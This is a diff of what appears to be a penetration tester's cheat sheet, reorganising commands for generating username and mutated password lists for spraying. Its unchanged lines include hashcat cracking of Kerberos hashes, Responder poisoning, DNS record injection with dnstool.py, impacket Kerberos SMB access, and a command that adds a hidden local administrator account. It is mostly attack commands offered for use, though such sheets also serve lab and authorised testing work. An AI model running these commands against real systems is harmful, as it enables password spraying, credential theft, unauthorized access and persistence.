@@ -124,6 +124,16 @@ MATCH (u)-[m:MemberOf]->(g)
 RETURN DISTINCT g, u, m, r1, n1, r2, n2, r3, connected
 LIMIT 1000
 
+## Create Custom Usernames List
+username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
+
+## Create Custom Passwords List
+psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o passwords
+
+## Sorting Lists
+cat usernames | sort -u | tee usernames
+cat passwords | sort -u | tee passwords
+
 ## Web
 curl http://$TARGET -s -I | grep 'Location:' | cut -d ' ' -f 2
 curl https://$TARGET -s -k -I | grep 'Location:' | cut -d ' ' -f 2
@@ -147,10 +157,6 @@ echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes; hashcat hashes $rocky
 ## Decoding
 echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
 echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
-
-## Sorting Lists
-cat usernames | sort -u | tee usernames
-cat passwords | sort -u | tee passwords
 
 ## Decompressing
 tar -xzvf backup.tar.gz -C .
@@ -179,9 +185,6 @@ sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
-
-## Create Custom Usernames
-username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
 
 ## Create an Administrator Account
 net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
@@ -678,10 +681,6 @@ cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
 
 +---------- Word Count Wordlist ----------+
 wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt
-
-+---------- Create Mutated Wordlist ----------+
-psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.txt
-
 
 [*] (21) FTP
 +---------- Spray Service ----------+
